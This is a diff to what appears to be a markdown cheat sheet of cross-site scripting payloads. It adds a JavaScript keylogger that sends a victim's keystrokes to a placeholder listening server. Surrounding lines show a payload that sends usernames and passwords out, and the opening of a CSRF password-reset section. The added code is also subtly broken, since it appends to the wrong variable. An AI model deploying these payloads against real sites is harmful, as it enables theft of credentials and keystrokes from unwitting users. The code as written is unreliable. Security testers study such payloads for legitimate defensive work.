@@ -113,6 +113,28 @@ body:username.value+':'+this.value
 });">
 ```
 
+### Keylogging
+
+The following script sends the keys pressed by the user to the listening server
+
+```
+var keys = "";
+document.onkeypress = function(e){
+    var get = window.event ? event : e;
+    var key = get.keyCode ? get.keyCode : get.charCode;
+    key = String.fromCharCode(key);
+    key += key;
+}
+
+window.setInterval(function(){
+    if(keys && keys !== ""){
+        var path = encodeURI("<listening server>?keys="+keys);
+        new Image().src = path;
+        keys = "";
+    }
+},<log interval ms>);
+```
+
 ### CSRF
 
 Use the following payload to send a request using AJAX to a page of the application. Can be used for instance to request  password reset for the user
